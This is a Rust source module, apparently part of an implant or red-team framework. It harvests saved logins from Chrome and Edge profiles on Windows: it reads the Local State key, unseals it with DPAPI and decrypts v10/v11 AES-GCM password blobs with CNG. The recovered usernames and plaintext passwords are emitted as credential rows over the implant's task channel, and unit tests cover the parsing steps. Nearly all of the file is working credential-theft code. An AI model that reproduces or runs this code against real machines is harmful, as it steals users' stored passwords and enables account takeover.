//! The browser-store edge (the module's whole platform surface):
//! where a Chromium profile lives, how its logins are sealed, and how
//! a row renders. The halves that must hold for a test -- the store
//! paths, the sealed-value split, the Local State key scan, the
//! CREATE-TABLE column binding, the row rendering -- are plain
//! functions this host runs anywhere; only the file reads, the DPAPI
//! unseal, and the CNG decrypt sit behind `cfg(windows)`, and the
//! Windows crosses the CI lane builds prove they compile.
//!
//! One platform fact shapes the verb's honesty: the stores and the
//! key belong to the user the implant runs as -- a store sealed under
//! another user's masterkeys refuses, and the refusal says the
//! mismatch rather than blaming the data. Nothing lands on disk: the
//! rows ride the task's channel into the audit chain, the secrets
//! through the credential rows the board renders masked.

use crate::arguments::Scope;
use crate::sqlite::Value;

/// One Chromium browser this module addresses. v1.0 carries the two
/// installs whose stores sit side by side under LOCALAPPDATA; other
/// Chromium lineages and Firefox's own store shape are the later
/// widening, not this module's surface.
pub(crate) struct Store {
    /// The name rows and messages print: it rides the credential
    /// row's kind and source fields.
    pub name: &'static str,
    /// The User Data root under LOCALAPPDATA -- the one directory
    /// whose Local State carries the key and whose subdirectories are
    /// the profiles.
    pub user_data: &'static str,
}

static STORES: [Store; 2] = [
    Store {
        name: "chrome",
        user_data: r"Google\Chrome\User Data",
    },
    Store {
        name: "edge",
        user_data: r"Microsoft\Edge\User Data",
    },
];

/// The concrete stores a scope sweeps, in the fixed order the answer
/// prints them.
pub(crate) fn scope_of(scope: Scope) -> &'static [Store] {
    match scope {
        Scope::All => &STORES,
        Scope::Chrome => &STORES[..1],
        Scope::Edge => &STORES[1..],
    }
}

/// Binds the logins table's three columns by name out of the CREATE
/// statement the store's own schema row carries -- the schema has
/// widened across Chromium versions, and a positional read that
/// guesses indices is exactly the half-read this module refuses to
/// ship. A column the schema dropped or renamed refuses naming it.
pub(crate) fn login_columns(columns: &[String]) -> Result<(usize, usize, usize), String> {
    let column = |name: &str| {
        columns
            .iter()
            .position(|candidate| candidate.eq_ignore_ascii_case(name))
            .ok_or_else(|| {
                format!("the store's schema carries no {name} column -- widened past this reader")
            })
    };
    Ok((
        column("origin_url")?,
        column("username_value")?,
        column("password_value")?,
    ))
}

/// The column names a CREATE TABLE statement declares: the parts
/// between the outer parentheses split on top-level commas, minus the
/// table-constraint parts (PRIMARY KEY, UNIQUE, CHECK, FOREIGN KEY,
/// CONSTRAINT), each surviving part's first identifier. Quoted
/// identifiers lose their quotes; the names read case-insensitively
/// everywhere they are used.
pub(crate) fn columns_of(create_sql: &str) -> Vec<String> {
    let Some(open) = create_sql.find('(') else {
        return Vec::new();
    };

    // The body: the outer parentheses' contents, top-level commas
    // respected -- a constraint's own parentheses must not split.
    let mut parts = Vec::new();
    let mut part = String::new();
    let mut depth = 0usize;
    let mut closed = false;
    for character in create_sql[open + 1..].chars() {
        match character {
            '(' if !closed => {
                depth += 1;
                part.push(character);
            }
            ')' if !closed && depth > 0 => {
                depth -= 1;
                part.push(character);
            }
            ')' if !closed => closed = true,
            ',' if !closed && depth == 0 => parts.push(std::mem::take(&mut part)),
            character if !closed => part.push(character),
            _ => {}
        }
    }
    if !part.trim().is_empty() {
        parts.push(part);
    }

    let mut columns = Vec::new();
    for candidate in parts {
        let candidate = candidate.trim();
        // The identifier ends at whitespace or the paren a tight
        // constraint opens (`UNIQUE(...)`, no space).
        let Some(first) = candidate.split([' ', '(']).next() else {
            continue;
        };
        let constraint = matches!(
            first.to_ascii_uppercase().as_str(),
            "PRIMARY" | "UNIQUE" | "CHECK" | "FOREIGN" | "CONSTRAINT"
        );
        if constraint {
            continue;
        }
        let name = first.trim_matches(|quote| matches!(quote, '"' | '`' | '[' | ']'));
        if !name.is_empty() {
            columns.push(name.to_string());
        }
    }
    columns
}

/// The os_crypt.encrypted_key value out of a Local State file: base64
/// text naming the DPAPI blob that holds the profile's AES key. The
/// scan is ordered (os_crypt first, then the key inside it) and the
/// value parses as a JSON string with the standard escapes honored --
/// anything else refuses rather than guessing characters out of the
/// file.
pub(crate) fn os_crypt_key(local_state: &str) -> Result<String, String> {
    let os_crypt = local_state
        .find("\"os_crypt\"")
        .ok_or("the Local State carries no os_crypt object -- the profile's key is absent")?;
    let name = local_state[os_crypt..]
        .find("\"encrypted_key\"")
        .map(|at| os_crypt + at)
        .ok_or(
            "the Local State's os_crypt carries no encrypted_key -- the profile's key is absent",
        )?;
    json_string_after(local_state, name + "\"encrypted_key\"".len())
}

/// The JSON string that follows the key name at `from`: whitespace, a
/// colon, whitespace, then the quoted value.
fn json_string_after(text: &str, from: usize) -> Result<String, String> {
    let bytes = text.as_bytes();
    let mut at = from;
    let skip_whitespace = |at: &mut usize| {
        while matches!(bytes.get(*at), Some(b' ' | b'\t' | b'\n' | b'\r')) {
            *at += 1;
        }
    };
    skip_whitespace(&mut at);
    if bytes.get(at) != Some(&b':') {
        return Err("the Local State's encrypted_key does not name its value".to_string());
    }
    at += 1;
    skip_whitespace(&mut at);
    if bytes.get(at) != Some(&b'"') {
        return Err("the Local State's encrypted_key value is not a string".to_string());
    }
    at += 1;

    // The value's bytes collect into a vector because the multi-byte
    // UTF-8 of the source passes through byte by byte; it decoded once
    // on the way in, so it decodes the same way on the way out.
    let mut value = Vec::new();
    loop {
        let byte = *bytes
            .get(at)
            .ok_or("the Local State ends inside the encrypted_key value")?;
        match byte {
            b'"' => {
                return String::from_utf8(value)
                    .map_err(|_| "the Local State's encrypted_key is not UTF-8".to_string());
            }
            b'\\' => {
                at += 1;
                let escape = *bytes
                    .get(at)
                    .ok_or("the Local State ends inside an escape in encrypted_key")?;
                match escape {
                    b'"' => value.push(b'"'),
                    b'\\' => value.push(b'\\'),
                    b'/' => value.push(b'/'),
                    b'b' => value.push(0x08),
                    b'f' => value.push(0x0C),
                    b'n' => value.push(b'\n'),
                    b'r' => value.push(b'\r'),
                    b't' => value.push(b'\t'),
                    b'u' => {
                        let hex = text
                            .get(at + 1..at + 5)
                            .ok_or("the encrypted_key escape is cut short")?;
                        let unit = u16::from_str_radix(hex, 16).map_err(|_| {
                            "the encrypted_key escape is not hexadecimal".to_string()
                        })?;
                        let character =
                            char::from_u32(unit as u32).unwrap_or(char::REPLACEMENT_CHARACTER);
                        let mut encoded = [0u8; 4];
                        value.extend_from_slice(character.encode_utf8(&mut encoded).as_bytes());
                        at += 4;
                    }
                    _ => {
                        return Err(format!(
                            "the encrypted_key value carries an unknown escape \\{}",
                            escape as char
                        ));
                    }
                }
            }
            control if control < 0x20 => {
                return Err(
                    "the Local State's encrypted_key value carries a control character".to_string(),
                );
            }
            other => value.push(other),
        }
        at += 1;
    }
}

/// The DPAPI blob magic: the pre-v10 Chromium shape sealed the
/// password as a plain DPAPI blob, and the magic is what tells it
/// apart from garbage before the protection API ever sees it.
const DPAPI_MAGIC: &[u8] = &[0x01, 0x00, 0x00, 0x00, 0xD0, 0x8C, 0x9D, 0xCF];

/// How a stored password is sealed, split out of the blob as it sits
/// in the row.
#[derive(Debug, PartialEq)]
pub(crate) enum Sealed<'a> {
    /// The row stored no password at all.
    Empty,
    /// The v10/v11 shape: a 3-byte version prefix, a 12-byte nonce,
    /// the ciphertext, and a trailing 16-byte GCM tag.
    Gcm {
        nonce: &'a [u8],
        ciphertext: &'a [u8],
        tag: &'a [u8],
    },
    /// The pre-v10 shape: the whole blob is a DPAPI blob.
    Legacy(&'a [u8]),
    /// The v20 app-bound shape, sealed through the browser's elevation
    /// service.
    AppBound,
}

/// Splits a password_value blob into the form it carries. A form the
/// module does not know refuses naming the blob's length rather than
/// feeding bytes to a decrypt that cannot answer for them.
pub(crate) fn sealed<'a>(blob: &'a [u8]) -> Result<Sealed<'a>, String> {
    if blob.is_empty() {
        return Ok(Sealed::Empty);
    }
    if blob.starts_with(b"v10") || blob.starts_with(b"v11") {
        if blob.len() < 3 + 12 + 16 {
            return Err(format!(
                "the stored password is cut short for the v10 form ({} bytes)",
                blob.len()
            ));
        }
        return Ok(Sealed::Gcm {
            nonce: &blob[3..15],
            ciphertext: &blob[15..blob.len() - 16],
            tag: &blob[blob.len() - 16..],
        });
    }
    if blob.starts_with(b"v20") {
        return Ok(Sealed::AppBound);
    }
    if blob.starts_with(DPAPI_MAGIC) {
        return Ok(Sealed::Legacy(blob));
    }
    Err(format!(
        "the stored password carries an unrecognized form ({} bytes)",
        blob.len()
    ))
}

/// The text a row's column reads as, whatever the record laid down:
/// text as itself, the numbers as their decimal shape, null as
/// nothing. A display read -- the value keeps its honesty by naming
/// what it is, not by refusing the row.
pub(crate) fn text_of(value: Option<&Value>) -> String {
    match value {
        Some(Value::Text(text)) => text.clone(),
        Some(Value::Blob(bytes)) => String::from_utf8_lossy(bytes).into_owned(),
        Some(Value::Integer(number)) => number.to_string(),
        Some(Value::Real(number)) => number.to_string(),
        _ => String::new(),
    }
}

/// The bytes a row's column reads as: the blob and text kinds as
/// their own bytes, the numbers as their decimal shape.
pub(crate) fn bytes_of(value: Option<&Value>) -> Vec<u8> {
    match value {
        Some(Value::Blob(bytes)) => bytes.clone(),
        Some(Value::Text(text)) => text.as_bytes().to_vec(),
        Some(Value::Integer(number)) => number.to_string().into_bytes(),
        Some(Value::Real(number)) => number.to_string().into_bytes(),
        _ => Vec::new(),
    }
}

/// What the row prints when the store kept no username: the credential
/// grammar's principal must be non-empty to parse, and naming the
/// absence is the honest way to give it one.
pub(crate) const NO_USERNAME: &str = "(no stored username)";

/// Escapes a value for the JSON-lines grammar: the two characters
/// JSON quotes and the control range below 0x20.
pub(crate) fn json_escape(text: &str) -> String {
    let mut out = String::with_capacity(text.len());
    for character in text.chars() {
        match character {
            '"' => out.push_str("\\\""),
            '\\' => out.push_str("\\\\"),
            control if (control as u32) < 0x20 => {
                out.push_str(&format!("\\u{:04X}", control as u32));
            }
            other => out.push(other),
        }
    }
    out
}

/// One login as the answer prints it: a credential row the board
/// parses -- kind and principal required, the rest as the sweep
/// carried it. The secret rides export alone; the note names any row
/// that refused decryption rather than silently dropping it.
pub(crate) fn login_row(
    store: &str,
    profile: &str,
    origin: &str,
    username: &str,
    secret: Option<&str>,
    note: Option<&str>,
) -> String {
    let principal = if username.is_empty() {
        NO_USERNAME
    } else {
        username
    };
    let quoted = |text: &str| format!("\"{}\"", json_escape(text));
    let mut row = format!(
        "{{\"kind\":\"{store} login\",\"principal\":{},\"host\":{},\"source\":\"{store}\\{profile}\"",
        quoted(principal),
        quoted(origin),
    );
    if let Some(secret) = secret {
        row.push_str(&format!(",\"secret\":{}", quoted(secret)));
    }
    if let Some(note) = note {
        row.push_str(&format!(",\"note\":{}", quoted(note)));
    }
    row.push('}');
    row
}

/// An unsealed password as the row prints it: UTF-8 text as itself,
/// opaque bytes as base64 with the note saying which it is.
pub(crate) fn secret_of(plain: &[u8]) -> (String, Option<String>) {
    match std::str::from_utf8(plain) {
        Ok(text) => (text.to_string(), None),
        Err(_) => (
            crate::base64::encode(plain),
            Some(format!(
                "the secret is {} opaque bytes rendered as base64",
                plain.len()
            )),
        ),
    }
}

/// The crypt32 error codes the unseal can meet, as the messages the
/// operator reads. The NTE family (0x8009xxxx) is the protection
/// API's own mismatch word -- the blob does not open under this
/// user's masterkeys -- and a code outside the table stands as its
/// number, never a guess at what the site's keys meant by it.
pub(crate) fn dpapi_status_message(status: i32) -> String {
    match status as u32 {
        5 => "access denied (the masterkey store refused this context)".to_string(),
        87 => "the data is not a DPAPI blob".to_string(),
        other if other & 0xFFFF_FF00 == 0x8009_0000 => {
            "the blob does not unseal under this user's masterkeys (sealed by another user \
             or another machine)"
                .to_string()
        }
        other => format!("dpapi error 0x{other:08X}"),
    }
}

// ---- the Windows calls ----

#[cfg(windows)]
mod win {
    use std::os::raw::c_void;

    const FILE_ATTRIBUTE_DIRECTORY: u32 = 0x10;
    const INVALID_HANDLE_VALUE: isize = -1;

    const GENERIC_READ: u32 = 0x8000_0000;
    const FILE_SHARE_READ: u32 = 0x1;
    const FILE_SHARE_WRITE: u32 = 0x2;
    const FILE_SHARE_DELETE: u32 = 0x4;
    const OPEN_EXISTING: u32 = 3;
    // The read cap: a login store is kilobytes and a Local State is
    // hundreds of them, and a file beyond this is not one this verb
    // was asked to read.
    const READ_CAP: usize = 64 << 20;

    const STATUS_SUCCESS: i32 = 0;
    // The tag-mismatch word CNG answers a failed GCM verification
    // with; the SDK headers this cross builds against predate the
    // name, so the value stands for itself.
    const STATUS_AUTH_TAG_MISMATCH: u32 = 0xC000_A002;

    type Handle = isize;

    /// The API's own record, `#[repr(C)]` against its documented
    /// layout. The fields the module never reads still ride for the
    /// struct's shape.
    #[repr(C)]
    #[allow(dead_code)]
    struct FindData {
        attributes: u32,
        creation_time: [u32; 2],
        last_access_time: [u32; 2],
        last_write_time: [u32; 2],
        size_high: u32,
        size_low: u32,
        reserved0: u32,
        reserved1: u32,
        file_name: [u16; 260],
        alternate_file_name: [u16; 14],
    }

    #[repr(C)]
    struct DataBlob {
        size: u32,
        data: *mut u8,
    }

    /// The CNG authenticated-cipher info, `#[repr(C)]` against
    /// bcrypt.h's own layout: the nonce and tag a GCM decrypt rides,
    /// every unused member zeroed.
    #[repr(C)]
    struct AuthInfo {
        size: u32,
        version: u32,
        nonce: *const u8,
        nonce_length: u32,
        auth_data: *const u8,
        auth_data_length: u32,
        tag: *const u8,
        tag_length: u32,
        mac_context: *const u8,
        mac_context_length: u32,
        aad_length: u32,
        data_length: u64,
        flags: u32,
    }

    #[link(name = "kernel32")]
    extern "system" {
        fn GetEnvironmentVariableW(name: *const u16, buffer: *mut u16, size: u32) -> u32;
        fn FindFirstFileW(pattern: *const u16, data: *mut FindData) -> isize;
        fn FindNextFileW(find: isize, data: *mut FindData) -> i32;
        fn FindClose(find: isize) -> i32;
        fn CreateFileW(
            path: *const u16,
            access: u32,
            share: u32,
            security: *const c_void,
            disposition: u32,
            flags: u32,
            template: Handle,
        ) -> Handle;
        fn ReadFile(
            file: Handle,
            buffer: *mut u8,
            to_read: u32,
            read: *mut u32,
            overlapped: *mut c_void,
        ) -> i32;
        fn CloseHandle(file: Handle) -> i32;
        fn LocalFree(memory: *mut c_void) -> *mut c_void;
        fn GetLastError() -> u32;
    }

    #[link(name = "crypt32")]
    extern "system" {
        fn CryptUnprotectData(
            data_in: *mut DataBlob,
            description: *mut *mut u16,
            entropy: *mut DataBlob,
            reserved: *mut c_void,
            prompt: *mut c_void,
            flags: u32,
            data_out: *mut DataBlob,
        ) -> i32;
    }

    #[link(name = "bcrypt")]
    extern "system" {
        fn BCryptOpenAlgorithmProvider(
            algorithm: *mut Handle,
            id: *const u16,
            implementation: *const u16,
            flags: u32,
        ) -> i32;
        fn BCryptSetProperty(
            object: Handle,
            property: *const u16,
            input: *mut u16,
            input_length: u32,
            flags: u32,
        ) -> i32;
        fn BCryptCloseAlgorithmProvider(algorithm: Handle, flags: u32) -> i32;
        fn BCryptGenerateSymmetricKey(
            algorithm: Handle,
            key: *mut Handle,
            key_object: *mut u8,
            key_object_length: u32,
            secret: *const u8,
            secret_length: u32,
            flags: u32,
        ) -> i32;
        fn BCryptDestroyKey(key: Handle) -> i32;
        fn BCryptDecrypt(
            key: Handle,
            input: *const u8,
            input_length: u32,
            padding: *const c_void,
            iv: *const u8,
            iv_length: u32,
            output: *mut u8,
            output_length: u32,
            produced: *mut u32,
            flags: u32,
        ) -> i32;
    }

    /// A NUL-terminated UTF-16 string, the encoding every `*W` entry
    /// point takes.
    fn wide(text: &str) -> Vec<u16> {
        text.encode_utf16().chain(std::iter::once(0)).collect()
    }

    /// The LOCALAPPDATA the Chromium stores live under: the fact of
    /// the user the implant runs as, not a path it guesses.
    pub(crate) fn local_appdata() -> Result<String, String> {
        unsafe {
            let name = wide("LOCALAPPDATA");
            let mut buffer = vec![0u16; 1024];
            let length =
                GetEnvironmentVariableW(name.as_ptr(), buffer.as_mut_ptr(), buffer.len() as u32);
            if length == 0 || length as usize >= buffer.len() {
                return Err(
                    "no LOCALAPPDATA environment for this user -- the Chromium stores live \
                     under it"
                        .to_string(),
                );
            }
            Ok(String::from_utf16_lossy(&buffer[..length as usize]))
        }
    }

    /// One find's attributes, or None when the path does not exist.
    fn attributes(path: &str) -> Option<u32> {
        unsafe {
            let mut data: FindData = std::mem::zeroed();
            let find = FindFirstFileW(wide(path).as_ptr(), &mut data);
            if find == INVALID_HANDLE_VALUE {
                return None;
            }
            FindClose(find);
            Some(data.attributes)
        }
    }

    pub(crate) fn directory_exists(path: &str) -> bool {
        attributes(path).is_some_and(|attributes| attributes & FILE_ATTRIBUTE_DIRECTORY != 0)
    }

    pub(crate) fn file_exists(path: &str) -> bool {
        attributes(path).is_some_and(|attributes| attributes & FILE_ATTRIBUTE_DIRECTORY == 0)
    }

    /// The subdirectories under a directory, sorted so two reads of
    /// one host report in the same order.
    pub(crate) fn subdirectories(path: &str) -> Vec<String> {
        unsafe {
            let mut data: FindData = std::mem::zeroed();
            let mut directories = Vec::new();
            let find = FindFirstFileW(wide(&format!(r"{path}\*")).as_ptr(), &mut data);
            if find == INVALID_HANDLE_VALUE {
                return directories;
            }
            loop {
                let length = data
                    .file_name
                    .iter()
                    .position(|unit| *unit == 0)
                    .unwrap_or(0);
                let name = String::from_utf16_lossy(&data.file_name[..length]);
                if data.attributes & FILE_ATTRIBUTE_DIRECTORY != 0 && name != "." && name != ".." {
                    directories.push(name);
                }
                if FindNextFileW(find, &mut data) == 0 {
                    break;
                }
            }
            FindClose(find);
            directories.sort();
            directories
        }
    }

    /// A file's bytes, read whole with every share mode offered -- a
    /// running browser holds its store open, and the read takes it as
    /// the browser leaves it or names the lock that refused.
    pub(crate) fn read_file(path: &str) -> Result<Vec<u8>, String> {
        unsafe {
            let file = CreateFileW(
                wide(path).as_ptr(),
                GENERIC_READ,
                FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                std::ptr::null(),
                OPEN_EXISTING,
                0,
                0,
            );
            if file == INVALID_HANDLE_VALUE {
                return Err(file_error(GetLastError()));
            }
            let read_all = || {
                let mut contents = Vec::new();
                let mut buffer = vec![0u8; 64 * 1024];
                loop {
                    let mut read: u32 = 0;
                    if ReadFile(
                        file,
                        buffer.as_mut_ptr(),
                        buffer.len() as u32,
                        &mut read,
                        std::ptr::null_mut(),
                    ) == 0
                    {
                        return Err(file_error(GetLastError()));
                    }
                    if read == 0 {
                        return Ok(contents);
                    }
                    if contents.len() + read as usize > READ_CAP {
                        return Err(format!(
                            "the file is larger than the {} MiB this reader takes",
                            READ_CAP >> 20
                        ));
                    }
                    contents.extend_from_slice(&buffer[..read as usize]);
                }
            };
            let contents = read_all();
            CloseHandle(file);
            contents
        }
    }

    pub(crate) fn file_error(code: u32) -> String {
        match code {
            2 => "the file does not exist".to_string(),
            3 => "the path does not exist".to_string(),
            5 => "access denied".to_string(),
            32 => {
                "the browser holds the file locked (its own process has the store open)".to_string()
            }
            other => format!("file error {other}"),
        }
    }

    /// Unseals a DPAPI blob under the running user's masterkeys. The
    /// plaintext is copied into owned memory and the API's buffer
    /// freed before the answer returns.
    pub(crate) fn dpapi_unseal(blob: &[u8]) -> Result<Vec<u8>, i32> {
        unsafe {
            let mut input = DataBlob {
                size: blob.len() as u32,
                data: blob.as_ptr() as *mut u8,
            };
            let mut output = DataBlob {
                size: 0,
                data: std::ptr::null_mut(),
            };
            let ok = CryptUnprotectData(
                &mut input,
                std::ptr::null_mut(),
                std::ptr::null_mut(),
                std::ptr::null_mut(),
                std::ptr::null_mut(),
                0x01, // CRYPTPROTECT_UI_FORBIDDEN
                &mut output,
            );
            if ok == 0 {
                return Err(GetLastError() as i32);
            }
            let plain = std::slice::from_raw_parts(output.data, output.size as usize).to_vec();
            LocalFree(output.data as *mut c_void);
            Ok(plain)
        }
    }

    /// The profile's AES-256-GCM key as an open CNG key: one provider
    /// and key handle per store sweep, closed when the sweep ends. The
    /// chaining mode rides the provider; the nonce and tag ride each
    /// decrypt's authenticated-cipher info.
    pub(crate) struct GcmKey {
        algorithm: Handle,
        key: Handle,
    }

    impl GcmKey {
        pub(crate) fn open(key: &[u8]) -> Result<GcmKey, i32> {
            unsafe {
                let mut algorithm: Handle = 0;
                let status = BCryptOpenAlgorithmProvider(
                    &mut algorithm,
                    wide("AES").as_ptr(),
                    std::ptr::null(),
                    0,
                );
                if status != STATUS_SUCCESS {
                    return Err(status);
                }
                let chaining = wide("ChainingMode");
                let mut mode = wide("ChainingModeGCM");
                let status = BCryptSetProperty(
                    algorithm,
                    chaining.as_ptr(),
                    mode.as_mut_ptr(),
                    (mode.len() * 2) as u32,
                    0,
                );
                if status != STATUS_SUCCESS {
                    BCryptCloseAlgorithmProvider(algorithm, 0);
                    return Err(status);
                }
                let mut handle: Handle = 0;
                let status = BCryptGenerateSymmetricKey(
                    algorithm,
                    &mut handle,
                    std::ptr::null_mut(),
                    0,
                    key.as_ptr(),
                    key.len() as u32,
                    0,
                );
                if status != STATUS_SUCCESS {
                    BCryptCloseAlgorithmProvider(algorithm, 0);
                    return Err(status);
                }
                Ok(GcmKey {
                    algorithm,
                    key: handle,
                })
            }
        }

        /// Opens one v10/v11 password: AES-256-GCM under the profile
        /// key, the nonce in the authenticated-cipher info the mode
        /// reads, the trailing tag verified by the call itself.
        pub(crate) fn decrypt(
            &self,
            nonce: &[u8; 12],
            ciphertext: &[u8],
            tag: &[u8; 16],
        ) -> Result<Vec<u8>, i32> {
            // Copied into mutable locals: the header types the nonce
            // and tag pointers writable, and this side keeps its
            // borrows shared.
            let mut nonce = *nonce;
            let mut tag = *tag;
            let mut info = AuthInfo {
                size: std::mem::size_of::<AuthInfo>() as u32,
                version: 1,
                nonce: nonce.as_mut_ptr(),
                nonce_length: nonce.len() as u32,
                auth_data: std::ptr::null(),
                auth_data_length: 0,
                tag: tag.as_mut_ptr(),
                tag_length: tag.len() as u32,
                mac_context: std::ptr::null(),
                mac_context_length: 0,
                aad_length: 0,
                data_length: 0,
                flags: 0,
            };
            let mut plain = vec![0u8; ciphertext.len()];
            let mut produced: u32 = 0;
            let status = unsafe {
                BCryptDecrypt(
                    self.key,
                    ciphertext.as_ptr(),
                    ciphertext.len() as u32,
                    &mut info as *mut AuthInfo as *const c_void,
                    std::ptr::null(), // the nonce rides the auth info for GCM
                    0,
                    plain.as_mut_ptr(),
                    plain.len() as u32,
                    &mut produced,
                    0,
                )
            };
            if status != STATUS_SUCCESS {
                return Err(status);
            }
            plain.truncate(produced as usize);
            Ok(plain)
        }
    }

    impl Drop for GcmKey {
        fn drop(&mut self) {
            unsafe {
                BCryptDestroyKey(self.key);
                BCryptCloseAlgorithmProvider(self.algorithm, 0);
            }
        }
    }

    /// The NTSTATUS codes the CNG calls can meet, as the messages the
    /// operator reads. A code outside the table stands as its number
    /// -- never a guess at what the provider meant by it.
    pub(crate) fn ntstatus_message(status: i32) -> String {
        match status as u32 {
            0xC000_000D => "the CNG call refused its parameters".to_string(),
            STATUS_AUTH_TAG_MISMATCH => {
                "the row's GCM tag did not verify (the profile key did not seal this row)"
                    .to_string()
            }
            other => format!("CNG error 0x{other:08X}"),
        }
    }
}

#[cfg(windows)]
pub(crate) use win::{
    directory_exists, dpapi_unseal, file_exists, local_appdata, ntstatus_message, read_file,
    subdirectories, GcmKey,
};

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn the_scope_order_is_the_fixed_sweep_order() {
        assert_eq!(scope_of(Scope::All).len(), 2);
        assert_eq!(scope_of(Scope::All)[0].name, "chrome");
        assert_eq!(scope_of(Scope::All)[1].name, "edge");
        assert_eq!(scope_of(Scope::Chrome).len(), 1);
        assert_eq!(scope_of(Scope::Chrome)[0].name, "chrome");
        assert_eq!(scope_of(Scope::Edge).len(), 1);
        assert_eq!(scope_of(Scope::Edge)[0].name, "edge");
    }

    #[test]
    fn the_column_names_bind_out_of_a_chromium_create_statement() {
        // The shape the store's own schema row carries: plain columns,
        // a DEFAULT, and table constraints whose own parentheses must
        // not split a part.
        let columns = columns_of(
            "CREATE TABLE logins (origin_url VARCHAR NOT NULL, \
             action_url VARCHAR, username_element VARCHAR, \
             username_value VARCHAR, password_element VARCHAR, \
             password_value BLOB, date_created INTEGER DEFAULT 0, \
             num_times_used INTEGER NOT NULL DEFAULT 0, \
             PRIMARY KEY (origin_url, username_element), \
             UNIQUE(origin_url, username_value), \
             CONSTRAINT unique_index UNIQUE (origin_url, username_value))",
        );
        assert_eq!(
            columns,
            vec![
                "origin_url",
                "action_url",
                "username_element",
                "username_value",
                "password_element",
                "password_value",
                "date_created",
                "num_times_used",
            ]
        );
        let bound = login_columns(&columns).unwrap();
        assert_eq!(bound, (0, 3, 5));

        // A schema without one of the three refuses naming it.
        let error = login_columns(&columns[..2]).unwrap_err();
        assert!(error.contains("username_value"), "{error}");
    }

    #[test]
    fn the_local_state_key_reads_out_of_the_json_it_sits_in() {
        let local_state = "{\"os_crypt\":{\"encrypted_key\":\"RFBBUElWTFJVRSIsIm5vdGhpbmc\"},\
             \"other\":{\"encrypted_key\":\"bm90IHRoaXMgb25l\"}}";
        assert_eq!(
            os_crypt_key(local_state).unwrap(),
            "RFBBUElWTFJVRSIsIm5vdGhpbmc"
        );

        // Escapes honor the JSON grammar; the base64 itself never
        // carries one, but the reader does not guess its way past a
        // value that does.
        let escaped = "{\"os_crypt\":{\"encrypted_key\":\"aGVsbG8gd29ybGQ=\"}}";
        assert_eq!(os_crypt_key(escaped).unwrap(), "aGVsbG8gd29ybGQ=");
        assert_eq!(
            os_crypt_key("{\"os_crypt\":{\"encrypted_key\":\"\\u0041\\nB\"}}").unwrap(),
            "A\nB"
        );

        // The absent facts refuse naming themselves.
        let error = os_crypt_key("{\"other\":{}}").unwrap_err();
        assert!(error.contains("os_crypt"), "{error}");
        let error = os_crypt_key("{\"os_crypt\":{}}").unwrap_err();
        assert!(error.contains("encrypted_key"), "{error}");
        // A malformed value refuses rather than half-reading it.
        assert!(os_crypt_key("{\"os_crypt\":{\"encrypted_key\":42}}").is_err());
        assert!(os_crypt_key("{\"os_crypt\":{\"encrypted_key\":\"cut}").is_err());
    }

    #[test]
    fn the_sealed_forms_split_as_the_store_laid_them_down() {
        // v10: prefix, nonce, ciphertext, tag.
        let mut blob = b"v10".to_vec();
        blob.extend_from_slice(&[0x11; 12]);
        blob.extend_from_slice(b"cipher");
        blob.extend_from_slice(&[0x22; 16]);
        assert_eq!(
            sealed(&blob).unwrap(),
            Sealed::Gcm {
                nonce: &[0x11; 12],
                ciphertext: b"cipher",
                tag: &[0x22; 16],
            }
        );

        // A v10 blob without the tag's 16 bytes refuses.
        let short = sealed(b"v10 twelve byte").unwrap_err();
        assert!(short.contains("cut short"), "{short}");

        // The other forms.
        assert_eq!(sealed(b"").unwrap(), Sealed::Empty);
        assert_eq!(sealed(b"v20 app bound").unwrap(), Sealed::AppBound);
        let mut legacy = DPAPI_MAGIC.to_vec();
        legacy.extend_from_slice(b"the rest of the blob");
        assert_eq!(sealed(&legacy).unwrap(), Sealed::Legacy(&legacy));

        // Garbage refuses naming its length.
        let error = sealed(b"not a form").unwrap_err();
        assert!(error.contains("unrecognized form"), "{error}");
    }

    #[test]
    fn a_row_renders_as_the_credential_grammar_reads() {
        let list = login_row(
            "chrome",
            "Default",
            "https://example.com/",
            "alice",
            None,
            None,
        );
        assert_eq!(
            list,
            "{\"kind\":\"chrome login\",\"principal\":\"alice\",\
             \"host\":\"https://example.com/\",\"source\":\"chrome\\Default\"}"
        );

        // Export adds the secret; a note rides beside it; the empty
        // username names its absence; every escaped field stays one
        // JSON string.
        let export = login_row(
            "edge",
            "Profile 1",
            "https://ex.com/",
            "",
            Some("s3cr3t"),
            None,
        );
        assert!(
            export.contains("\"principal\":\"(no stored username)\""),
            "{export}"
        );
        assert!(export.contains("\"secret\":\"s3cr3t\""), "{export}");
        assert!(
            export.contains("\"source\":\"edge\\Profile 1\""),
            "{export}"
        );

        let quoted = login_row(
            "chrome",
            "Default",
            "a\"b\\c",
            "alice",
            Some("pass\nword"),
            None,
        );
        assert!(quoted.contains("\"host\":\"a\\\"b\\\\c\""), "{quoted}");
        // The control range escapes as the grammar's \u00XX form.
        assert!(
            quoted.contains("\"secret\":\"pass\\u000Aword\""),
            "{quoted}"
        );

        let noted = login_row(
            "chrome",
            "Default",
            "https://ex.com/",
            "alice",
            None,
            Some("v20"),
        );
        assert!(noted.contains("\"note\":\"v20\""), "{noted}");
        assert!(!noted.contains("\"secret\""), "{noted}");
    }

    #[test]
    fn a_secret_renders_as_text_or_base64_by_what_it_is() {
        assert_eq!(
            secret_of(b"correct horse"),
            ("correct horse".to_string(), None)
        );
        let (rendered, note) = secret_of(&[0xFF, 0x00, 0xFE]);
        assert_eq!(rendered, base64_of(&[0xFF, 0x00, 0xFE]));
        assert!(note.unwrap().contains("opaque bytes"));
    }

    fn base64_of(bytes: &[u8]) -> String {
        crate::base64::encode(bytes)
    }

    #[test]
    fn the_text_and_byte_reads_name_what_each_value_is() {
        assert_eq!(text_of(Some(&Value::Text("alice".into()))), "alice");
        assert_eq!(text_of(Some(&Value::Integer(32))), "32");
        assert_eq!(text_of(Some(&Value::Null)), "");
        assert_eq!(text_of(None), "");
        assert_eq!(
            bytes_of(Some(&Value::Blob(b"v10".to_vec()))),
            b"v10".to_vec()
        );
        assert_eq!(bytes_of(Some(&Value::Text("v10".into()))), b"v10".to_vec());
        assert!(bytes_of(None).is_empty());
    }

    #[test]
    fn the_dpapi_table_names_the_codes_operators_meet() {
        let mismatch = dpapi_status_message(0x8009_0005u32 as i32);
        assert!(mismatch.contains("another user"), "{mismatch}");
        assert_eq!(dpapi_status_message(87), "the data is not a DPAPI blob");
        // An untabled code keeps its number -- never a guessed cause.
        assert_eq!(dpapi_status_message(6), "dpapi error 0x00000006");
    }
}
